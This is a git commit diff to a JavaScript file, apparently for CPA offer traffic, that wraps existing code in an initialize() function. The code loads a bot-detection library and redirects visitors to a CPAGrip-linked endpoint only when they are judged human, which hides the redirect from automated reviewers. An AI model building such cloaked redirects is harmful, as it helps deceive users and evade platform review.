f408d958aab4d991fe74d89b25ec8ce250ffc045
ninonur <39723243+ninonur@users.noreply.github.com>
2024-05-29 11:13:04 +0900

    Update cpa-go.js

--- remote/cpa-go.js
+++ remote/cpa-go.js
@@ -2,20 +2,22 @@
 var json = 'https://blossombabes.my.id/cpagrip/jsoncpagrip.php';
 var xhttp = new XMLHttpRequest();
 
-var script = document.createElement('script');
-script.onload = function () {
-  console.log("bot checker");
-  new BotDetector({
-    timeout: 1000,
-    callback: function(result) {
-      if(result.isBot === false) {
-        redirectCPA();
+function initialize() {
+  console.log("init");
+  var script = document.createElement('script');
+  script.onload = function () {
+    new BotDetector({
+      timeout: 1000,
+      callback: function(result) {
+        if(result.isBot === false) {
+          redirectCPA();
+        }
       }
-    }
-  }).monitor();
-};
-script.src = 'https://cdn.jsdelivr.net/gh/RoBYCoNTe/js-bot-detector/bot-detector.js';
-document.head.appendChild(script);
+    }).monitor();
+  };
+  script.src = 'https://cdn.jsdelivr.net/gh/RoBYCoNTe/js-bot-detector/bot-detector.js';
+  document.head.appendChild(script);
+}
 
 function redirectCPA() {
   xhttp.open("GET", json, true);
